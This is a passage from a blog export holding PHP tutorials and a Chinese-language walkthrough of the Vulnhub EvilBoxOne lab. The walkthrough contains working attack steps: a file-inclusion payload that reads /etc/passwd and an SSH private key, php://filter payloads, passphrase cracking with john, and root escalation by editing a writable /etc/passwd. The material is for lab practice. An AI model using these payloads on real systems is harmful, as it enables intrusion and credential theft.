<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&quot;100&quot;</span> != <span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="string">&quot;100&quot;</span> &lt;&gt; <span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="string">&quot;100&quot;</span> !== <span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117113317.png" /></p>
<p>前者只需要值不同，则返回 <code>true</code>，值相同则返回
<code>false</code>；而后者需要比较值和类型，只要有一个不相等就返回
<code>true</code>，否则返回 <code>false</code>。</p>
<h1 id="表达式">2. 表达式</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117113630.png" /></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>6 Vulnhub EvilBoxOne Writeup</title>
    <url>/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度介于简单和中等之间。不过还是能够学到很多知识。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://www.vulnhub.com/entry/evilbox-one,736/">evilbox_one</a></p>
<p>难度：Easy/Medium (Intermediate)</p>
<p>目标：取得root权限 + 2 Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>强制访问（路径爆破）</li>
<li><strong>参数爆破</strong></li>
<li>文件包含</li>
<li>PHP封装器（伪协议）</li>
<li>任意文件读取</li>
<li><strong>SSH公钥登录</strong></li>
<li><strong>离线密码破解</strong></li>
<li>系统权限漏洞利用</li>
</ul>
<h1 id="渗透">渗透</h1>
<p>攻击机kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -gaq 10.0.2.0/24</span><br><span class="line"></span><br><span class="line">-a: 显示可ping通的目标</span><br><span class="line">-g: 生成目标列表(不能与 -f 同时使用)，可指定目标的开始和结束IP， 或者提供ip的子网掩码</span><br><span class="line">-q: 安静模式(不显示每个目标或每个ping的结果)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214147.png" /></p>
<p>靶机的IP为：10.0.2.9</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214333.png" /></p>
<p>靶机打开了两个端口：22和80</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br><span class="line"></span><br><span class="line">-A 等价于 -sV -sC -O 的组合</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214416.png" /></p>
<ul>
<li>22端口的服务为ssh，这里其实可以尝试爆破</li>
<li>80端口的服务为http，CMS是Apache2，版本为2.4.38</li>
<li>靶机操作系统为Debian</li>
<li>系统内核版本为 4.x或者5.x，该工具猜测为4.15-5.6</li>
<li>其他信息</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>访问<code>10.0.2.9:80</code>发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220602.png" /></p>
<p>发现了一个新的目录<code>/secret</code>，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220925.png" /></p>
<p>发现了在该目录下还存在着两个文件。把每一个都访问一下。发现两个文件的内容都为空。此时，有可能是该网页只有传入参数才能够显示一些内容，但是我们并不知道有哪些参数，并且参数的值应该为什么也不知道。这时候就可以利用<strong>参数爆破</strong>。</p>
<h2 id="参数爆破">参数爆破</h2>
<p>参数爆破时，参数值一般有两种情况：</p>
<ol type="1">
<li>数字、字母这些常见的值以及容易引起SQL注入的字符（如单引号）等；</li>
<li>网页上可能存在文件包含（如果没有传入文件名，很有可能内容为空），此时就需要将网站已经存在的文件名作为参数值</li>
</ol>
<p>先尝试第一种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w [参数字典]:PARAM -w [参数值字典]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"></span><br><span class="line">-fs 过滤。 -fs 0 表示如果页面返回的内容为空则过滤（不显示）</span><br></pre></td></tr></table></figure></p>
<p>发现没有任何结果。那么接下来尝试第二种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line"></span><br><span class="line">如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替</span><br></pre></td></tr></table></figure></p>
<p>（这里因为<code>secret</code>目录下的<code>index.html</code>内容为空，所以使用网站目录下的<code>index.html</code>）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221820.png" /></p>
<p>此时爆出一个参数名 command。我们用浏览器验证一下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221946.png" /></p>
<p>发现确实存在，这像是<strong>文件包含漏洞</strong>，如果我们包含<code>evil.php</code>发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>（Linux中 <code>cd ..</code>
是返回上一级目录，如果<code>cd ../../../../../</code>返回五次上级目录，如果不够5次，那就返回到根目录则停止。）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406224234.png" /></p>
<p>发现确实存在<strong>文件包含漏洞</strong>。</p>
<h2 id="文件包含漏洞利用">文件包含漏洞利用</h2>
<p>文件包含漏洞的利用一般有以下几种：</p>
<ol type="1">
<li>如果存在<strong>远程文件包含</strong>，则可以在自己的主机写一句话，然后让靶机包含该文件；</li>
<li>如果不存在<strong>远程文件包含</strong>，利用伪协议往靶机写入一句话；</li>
<li>如果前两者都不行，那么就利用伪协议进行信息收集；</li>
</ol>
<h3 id="远程文件包含">远程文件包含</h3>
<p>先验证是否存在远程文件包含，随便在kali上写一个文件：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure></p>
<p>然后开启http服务（先用浏览器访问一下是否成功开启）：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406222903.png" /></p>
<p>最后，在url包含kali上的该文件，如果显示的内容与上图相同则说明存在远程包含。很可惜，结果是空，也就是不存在该漏洞。</p>
<h3 id="伪协议写文件">伪协议写文件</h3>
<blockquote>
<p>php://filter默认是read，但是可以write！利用这个可以写一句话。但是可能没有写入的权限。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=aGVsbG8gd29ybGQ=</span><br><span class="line"></span><br><span class="line">hello world经过base64编码：aGVsbG8gd29ybGQ=</span><br></pre></td></tr></table></figure>
<p>访问之后发现页面还是空白，并不知道是否成功写入（默认写在当前目录）。直接访问该文件验证一下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406223423.png" /></p>
<p>发现并没有写入成功，因此证明没有写文件的权限。</p>
<h3 id="伪协议信息收集">伪协议信息收集</h3>
<p>可以先读取<code>evil.php</code>的内容。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure></p>
<p>将得到的结果base64解码后得到： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这也说明了该文件确实存在<strong>文件包含漏洞</strong>。</p>
<h2 id="边界突破get-shell">边界突破（GET SHELL）</h2>
<h3 id="ssh爆破">SSH爆破</h3>
<p>从之前的信息收集发现有两个账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>因此尝试对这两个账号进行密码爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  </span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225551.png" /></p>
<p>发现并没有成功，当然也可能是我的字典太小了。因此尝试其他办法。</p>
<h3 id="ssh私钥泄露ssh公钥登录">SSH私钥泄露（SSH公钥登录）</h3>
<p>本来思路已经断了，就去搜索了一下，发现SSH除了密码登陆之外还可能存在着公钥登录，不过需要知道私钥，不过可以利用<strong>文件包含漏洞</strong>来读取私钥。</p>
<p><strong>第一步，先判断以下靶机是否支持SSH公钥登录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225910.png" /></p>
<p>注意箭头指向的那句话，说明<code>mowree</code>存在公钥登录。（虽然root也存在，但是私钥和公钥文件一般保存在用户家目录，而我们肯定没有权限读取root目录下的文件，否则也不用get
shell）</p>
<p><strong>第二步，读取公钥和私钥的信息</strong></p>
<blockquote>
<p>如果支持公钥登录的话，那么该用户的家目录应该包含相关的信息，比如默认位置
公钥：<code>/home/username/.ssh/authorized_keys</code>（可以看到加密算法）
私钥：<code>/home/username/.ssh/id_rsa</code>（如果加密算法为rsa的话）</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p>查看页面源码的格式比较好看（注意格式不要改变）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p><strong>第三步，利用私钥登录</strong></p>
<p>将私钥写入到一个文件，然后执行下面命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -i id_rsa <span class="comment"># 文件名可以任意</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231421.png" /></p>
<hr />
<p><strong>提示</strong>：</p>
<p>不论将私钥所在的文件名是什么，一定要将权限设置为600，否则会报错，提示权限不够。（一般公、私钥的文件配置都是600）就像下图一样：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231324.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
<hr />
<p>使用私钥登录发现还需要输入一个<code>passphrase</code>。</p>
<blockquote>
<p>公私钥对生成的时候，有时候会给私钥加一个密码，要想利用公钥登录方式的话，就必须输入加密私钥的密码。
可以使用密码爆破。有hashcat， john等工具</p>
</blockquote>
<p>先将 id_rsa
进行格式转换为john能够识别的（目录在<code>/usr/share/john</code>）：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ssh2john.py /home/hdfzzf/id_rsa &gt; /home/hdfzzf/<span class="built_in">hash</span></span><br></pre></td></tr></table></figure></p>
<p>然后进行破解（最好找一个大一点的字典，建议<code>/usr/share/wordlists/rockyou.txt.gz</code>）：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment"># 将字典和hash放到同一目录</span></span><br><span class="line"></span><br><span class="line">爆破结果：unicorn</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232742.png" /></p>
<p>再次利用SSH公钥登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh mowree@10.0.2.9 -i id_rsa</span><br><span class="line">2. 输入密码：unicorn</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232911.png" /></p>
<p>成功get shell！</p>
<h2 id="权限提升">权限提升</h2>
<p>Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null <span class="comment"># 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息</span></span><br></pre></td></tr></table></figure></p>
<p>要查找第三方编写的程序是否具有SUID/SGID。经查找发现并没有可用的。</p>
<p>这里介绍一个新的提权思路：<strong>查找靶机上当前用户拥有写权限且拥有者为root的文件，然后改写文件内容实现提权（比如写入nc反弹shell的命令）</strong>。</p>
<p>利用下述命令寻找拥有写权限的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc|grep -v run|grep -v sys</span><br><span class="line"></span><br><span class="line">查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看</span><br><span class="line"></span><br><span class="line">2: 表示标准错误</span><br><span class="line"><span class="string">&#x27;&gt;&#x27;</span>: 重定向</span><br><span class="line">/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。</span><br></pre></td></tr></table></figure></p>
<p>此时注意到这么一个文件：<code>/etc/passwd</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407085603.png" /></p>
<p>这个文件存储的靶机上所有用户的信息，一般用户只有读权限，而没有写权限。而这台靶机上却拥有写权限，这是一个极大的漏洞！</p>
<blockquote>
<p>小知识：<code>/etc/passwd</code>里面的第二个字段是密码字段，一般都只有一个x，表示密码已加密保存在<code>/etc/shadow</code>（这文件普通用户连读权限都没有）。但是，优先级是<code>/etc/passwd</code>优先，也就是如果<code>/etc/passwd</code>里面密码字段保存了密码，那么<code>/etc/shadow</code>中的密码就会失效！</p>
</blockquote>
<p>接下来的思路很明确了，修改<code>/etc/passwd</code>中root的密码字段，然后直接用<code>su -</code>命令切换。（也可以直接添加一条记录<code>echo "root2:加密密码:0:0:root:/root:/bin/bash"</code>，因为用户名不是最重要的，重要的是uid，uid为0即使用户名不是root，也拥
有root权限。）</p>
<p>生成密码的加密密文： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 root <span class="comment"># -1 某种加密算法</span></span><br><span class="line"></span><br><span class="line">明文：root</span><br><span class="line">密文：$1$yKHIKZSK<span class="variable">$R26qtrasBuYAfoQJvngpU0</span></span><br></pre></td></tr></table></figure></p>
<p>（这里操作需要注意：需要在正常模式下删除和粘贴密码，插入模式下上下左右删都会被解析为字符）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090904.png" /></p>
<p>然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - 或者 su root <span class="comment"># 登录root</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090950.png" /></p>
<p>成功登录。</p>
<p>第一个flag在<code>/home/mowree/user.txt</code>，第二个flag在<code>/root/root.txt</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br><span class="line">root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
<p>到此，本台靶机的渗透结束。</p>
<h2 id="验证操作">验证操作</h2>
<p>发现即使改了root的密码，也无法直接用ssh直接登录root，原因是权限不够。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091627.png" /></p>
<p>但是，如果改了<code>mowree</code>的密码，则可以直接使用ssh的密码登录。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091712.png" /></p>
<h1 id="总结">总结</h1>
<p>对该靶机的练习，学到了许多东西。</p>
<p>在web方面，除了之前的路径爆破之外，还了解到了<strong>参数爆破</strong>。已经<strong>文件包含漏洞的利用</strong>。在权限提升和反弹shell上，学到了<strong>SSH爆破</strong>和<strong>SSH公钥登录</strong>，还有这其中使用的一些小工具。</p>
<p>还有一些Linux的小知识，比如可以多返回几次上一级目录，以及<code>find</code>命令的基本使用等。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SSH公钥登录</tag>
        <tag>参数爆破</tag>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>6. 函数</title>
    <url>/2022/11/18/6.%20%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="函数的基本概念与语法">1. 函数的基本概念与语法</h1>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funcName</span>(<span class="params">param1, param2, param3,..</span>)</span>&#123;</span><br><span class="line">	codes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMess</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;my name is &#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> showMess(<span class="string">&#x27;takagi&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117145743.png" /></p>
<h1 id="函数参数">2. 函数参数</h1>
<h2 id="值参数和引用参数">2.1. 值参数和引用参数</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span> += <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$num = &#x27;</span>.<span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;函数demo的返回值 $num = &#x27;</span>.demo(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;调用函数之后的$num = &#x27;</span>.<span class="variable">$num</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117150248.png" /></p>
<p>这就是值参数，指示把值传入函数，相当于函数内创建了一个与全局变量
<code>$num</code>
相同名字的局部变量，对局部变量的修改不会影响到全局变量；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">&amp;<span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span> += <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$num = &#x27;</span>.<span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;函数demo的返回值 $num = &#x27;</span>.demo(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;调用函数之后的$num = &#x27;</span>.<span class="variable">$num</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117150353.png" /></p>
<p>引用参数可以理解为 C
中传入指针，函数内的变量和全局变量指向的是同一个块内存地址，所以函数内修改也会影响到函数外变量的值。</p>
<h2 id="默认参数">2.2. 默认参数</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"><span class="variable">$i</span>=<span class="number">1</span>, <span class="variable">$j</span>=<span class="number">2</span>, <span class="variable">$k</span>=<span class="number">3</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$i + $j + $k = &#x27;</span>.(<span class="variable">$i</span> + <span class="variable">$j</span> + <span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> demo();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>  demo(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> demo(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> demo(<span class="variable">$i</span>=<span class="number">10</span>, <span class="variable">$k</span>=<span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117151120.png" /></p>
<p>默认参数就是在定义函数时给参数设置默认值，如果调用函数时没有传入参数，则使用默认值，如果传入参数，则使用传入值。</p>
<p>需要注意：传入的参数必须按照顺序，无法通过
<code>demo($i=10, $k=30)</code> 方式跳过中间的默认参数。</p>
<h2 id="可变参数">2.3. 可变参数</h2>
<p>函数可以接受任意数量的参数，适合于实际参数大于形式参数。<code>func_get_args()</code>
：用在函数体内，将函数当前的参数打包到一个数组内返回。</p>
